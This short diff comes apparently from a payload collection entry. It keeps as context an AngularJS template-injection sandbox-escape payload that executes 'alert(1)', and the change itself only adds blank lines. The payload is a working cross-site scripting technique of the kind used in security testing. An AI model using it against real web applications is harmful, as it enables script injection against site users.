@@ -14,3 +14,5 @@ updated_at: '2023-04-10T20:24:51.896096+00:00'
 ```javascript
 {{a='constructor';b={};a.sub.call.call(b[a].getOwnPropertyDescriptor(b[a].getPrototypeOf(a.sub),a).value,0,'alert(1)')()}}
 ```
+
+
